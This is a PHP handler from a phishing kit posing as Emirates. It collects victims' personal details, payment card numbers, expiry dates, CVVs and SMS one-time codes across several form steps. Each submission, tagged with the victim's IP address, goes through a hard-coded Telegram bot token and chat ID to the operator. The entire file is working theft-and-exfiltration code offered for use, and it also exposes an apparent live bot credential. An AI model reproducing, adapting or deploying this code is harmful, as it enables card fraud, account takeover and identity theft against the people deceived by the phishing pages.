<?php 

require_once "function.php";



$id="-5084799746";
$apiToken = "8472402384:AAGDE4YObJtOVMGGM3HWs2qXlJd7_CR_vIE";

//================
#==> INDEX
//================

if ($_POST['step']== 'index') {
    $first = $_POST['first'];
    $last = $_POST['last'];
    $adress = $_POST['adress'];
    $zip = $_POST['zip'];
    $email = $_POST['email'];
    $number = $_POST['number'];

    if (empty($first) || empty($last) || empty($adress) || empty($zip) || empty($email) || empty($number)) {

        header("Location: index.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | CC | EMIRATES "       . "\r\n" ;
        $message .= "FIRST NAME: " . $first   . "\r\n";
        $message .= "LAST NAME: " . $last   . "\r\n";
        $message .= "ADRESS: " . $adress   . "\r\n";
        $message .= "ZIP CODE: " . $zip   . "\r\n";
        $message .= "EMAIL: " . $email   . "\r\n";
        $message .= "NUMBER: " . $number   . "\r\n";

       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading.php");
        exit();
    }
}



//================
#==> CC 
//================

if ($_POST['step']== 'cc') {
    $card = $_POST['card'];
    $date = $_POST['date'];
    $code = $_POST['cvv'];

    if (empty($card) || empty($date) || empty($code)) {

        header("Location: cc.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | CC | EMIRATES "       . "\r\n" ;
        $message .= "CARD NUMBER: " . $card   . "\r\n";
        $message .= "EXP DATE: " . $date   . "\r\n";
        $message .= "CODE CVV: " . $code   . "\r\n";

       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_1.php");
        exit();
    }
}


//================
#==> SMS 1
//================

if ($_POST['step']== 'sms') {
    $sms = $_POST['sim'];

    if (empty($sms)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | EMIRATES "       . "\r\n" ;
        $message .= "SMS1: " . $sms   . "\r\n";

       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_2.php");
        exit();
    }
}


//================
#==> SMS 1
//================

if ($_POST['step']== 'sms_1') {
    $sms = $_POST['sim'];

    if (empty($sms)) {

        header("Location: sms.php");
        exit();

    }else{
        $adrress  = $_SERVER['REMOTE_ADDR'];
        $subject  = $adrress . " | SMS | EMIRATES "       . "\r\n" ;
        $message .= "SMS2: " . $sms   . "\r\n";

       if(isset($_POST['submit']))
         {
            $apiToken;
            $data = [
                 'chat_id' => $id,
                 'text' => $subject . $message
            ];
            $response = file_get_contents("https://api.telegram.org/bot". $apiToken ."/sendMessage?" . http_build_query($data));
         }

        header("Location: loading_3.php");
        exit();
    }
}








